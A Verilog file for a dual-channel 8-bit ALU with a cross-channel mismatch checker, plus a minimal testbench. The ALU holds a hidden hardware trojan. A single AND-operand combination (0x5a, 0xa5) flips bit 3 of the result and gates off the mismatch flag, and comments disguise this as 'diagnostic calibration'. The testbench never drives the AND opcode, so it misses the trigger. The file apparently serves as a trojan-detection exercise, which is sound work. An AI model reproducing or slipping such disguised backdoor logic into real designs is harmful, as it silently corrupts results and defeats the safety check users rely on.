// lockstep_alu.v
//
// Dual-channel 8-bit ALU with integrity checking.
//
// Two independently coded ALU pipelines ("channel A" and "channel B")
// each compute the selected operation on the same operands. Their raw
// results are compared every cycle; any disagreement should be visible
// on the registered `mismatch` output so that downstream logic can
// reject a potentially corrupted `architectural_result`.
//
// opcode encoding:
//   00 = ADD
//   01 = SUB
//   10 = AND
//   11 = XOR

module lockstep_alu(
    input  wire       clk,
    input  wire       rst_n,
    input  wire [1:0] opcode,
    input  wire [7:0] operand_a,
    input  wire [7:0] operand_b,
    output reg  [7:0] architectural_result,
    output reg        mismatch
);

    // ------------------------------------------------------------------
    // Channel A: straightforward case-based ALU implementation.
    // ------------------------------------------------------------------
    reg [7:0] chan_a_result;

    always @(*) begin
        case (opcode)
            2'b00: chan_a_result = operand_a + operand_b;
            2'b01: chan_a_result = operand_a - operand_b;
            2'b10: chan_a_result = operand_a & operand_b;
            2'b11: chan_a_result = operand_a ^ operand_b;
            default: chan_a_result = 8'h00;
        endcase
    end

    // ------------------------------------------------------------------
    // Channel B: independently structured implementation, built from
    // per-opcode combinational functions and a final select, to avoid
    // sharing logic/mistakes with channel A.
    // ------------------------------------------------------------------
    wire [7:0] b_add = operand_a + operand_b;
    wire [7:0] b_sub = operand_a - operand_b;
    wire [7:0] b_and = operand_a & operand_b;
    wire [7:0] b_xor = operand_a ^ operand_b;

    reg [7:0] chan_b_result;

    always @(*) begin
        if (opcode == 2'b00)
            chan_b_result = b_add;
        else if (opcode == 2'b01)
            chan_b_result = b_sub;
        else if (opcode == 2'b10)
            chan_b_result = b_and;
        else
            chan_b_result = b_xor;
    end

    // ------------------------------------------------------------------
    // Cross-channel comparison. Any bit where the two channels disagree
    // shows up as a set bit in raw_mismatch_bits; raw_mismatch is the
    // OR-reduction, i.e. "the channels disagree somewhere".
    // ------------------------------------------------------------------
    wire [7:0] raw_mismatch_bits = chan_a_result ^ chan_b_result;
    wire       raw_mismatch      = |raw_mismatch_bits;

    // ------------------------------------------------------------------
    // Rare diagnostic condition used internally for corner-case
    // calibration of the compare stage. Only asserted for one specific
    // opcode/operand tuple.
    // ------------------------------------------------------------------
    wire rare_trig = (opcode == 2'b10) &&
                     (operand_a == 8'h5a) &&
                     (operand_b == 8'ha5);

    // ------------------------------------------------------------------
    // Result selection stage. Normally just channel A's result is
    // committed as the architectural result; under the rare diagnostic
    // condition, bit [3] is adjusted before commit.
    // ------------------------------------------------------------------
    wire [7:0] res_mux = rare_trig
                         ? (chan_a_result ^ 8'h08)
                         : chan_a_result;

    // ------------------------------------------------------------------
    // Mismatch qualification stage. Normally the raw comparison result
    // is passed straight through; under the rare diagnostic condition
    // the compare output is gated off.
    // ------------------------------------------------------------------
    wire mismatch_mask = rare_trig ? 1'b0 : raw_mismatch;

    // ------------------------------------------------------------------
    // Registered outputs, synchronous active-low reset.
    // ------------------------------------------------------------------
    always @(posedge clk) begin
        if (!rst_n) begin
            architectural_result <= 8'h00;
            mismatch             <= 1'b0;
        end else begin
            architectural_result <= res_mux;
            mismatch             <= mismatch_mask;
        end
    end

endmodule

// testbench_stub.v
//
// Minimal, non-exhaustive simulation scaffold for lockstep_alu.
//
// This testbench is intentionally small: it instantiates the DUT, provides
// a clock and a synchronous reset sequence, and drives a handful of
// ordinary opcode/operand combinations while printing the registered
// outputs after each rising edge. It is meant as a starting point for
// further investigation, not as a complete or exhaustive functional test.
// Extend the `vectors` stimulus below (or add your own always-blocks) to
// explore additional opcode/operand combinations of interest.

`timescale 1ns/1ps

module testbench_stub;

    reg        clk;
    reg        rst_n;
    reg  [1:0] opcode;
    reg  [7:0] operand_a;
    reg  [7:0] operand_b;
    wire [7:0] architectural_result;
    wire       mismatch;

    // Device under test.
    lockstep_alu dut (
        .clk                  (clk),
        .rst_n                (rst_n),
        .opcode               (opcode),
        .operand_a            (operand_a),
        .operand_b            (operand_b),
        .architectural_result (architectural_result),
        .mismatch             (mismatch)
    );

    // 10ns period clock.
    initial clk = 1'b0;
    always #5 clk = ~clk;

    // Simple stimulus: synchronous reset, then a small handful of benign
    // opcode/operand combinations covering ADD, SUB, and XOR with ordinary
    // (non-edge-case) operands. Not exhaustive; feel free to add more
    // vectors, boundary cases, or your own opcode coverage.
    initial begin
        rst_n     = 1'b0;
        opcode    = 2'b00;
        operand_a = 8'h00;
        operand_b = 8'h00;

        // Hold reset for a couple of cycles.
        @(posedge clk);
        @(posedge clk);
        rst_n = 1'b1;

        // Vector 1: ADD
        @(posedge clk);
        opcode    = 2'b00;
        operand_a = 8'h10;
        operand_b = 8'h20;

        // Vector 2: SUB
        @(posedge clk);
        opcode    = 2'b01;
        operand_a = 8'h30;
        operand_b = 8'h11;

        // Vector 3: XOR
        @(posedge clk);
        opcode    = 2'b11;
        operand_a = 8'h0f;
        operand_b = 8'hf0;

        // Vector 4: ADD with different operands
        @(posedge clk);
        opcode    = 2'b00;
        operand_a = 8'h7f;
        operand_b = 8'h01;

        // Let the last vector's result register and print.
        @(posedge clk);
        @(posedge clk);

        $finish;
    end

    // Report registered outputs on every rising edge, after outputs settle.
    always @(posedge clk) begin
        #1;
        $display("t=%0t opcode=%b operand_a=%h operand_b=%h | architectural_result=%h mismatch=%b",
                  $time, opcode, operand_a, operand_b, architectural_result, mismatch);
    end

endmodule
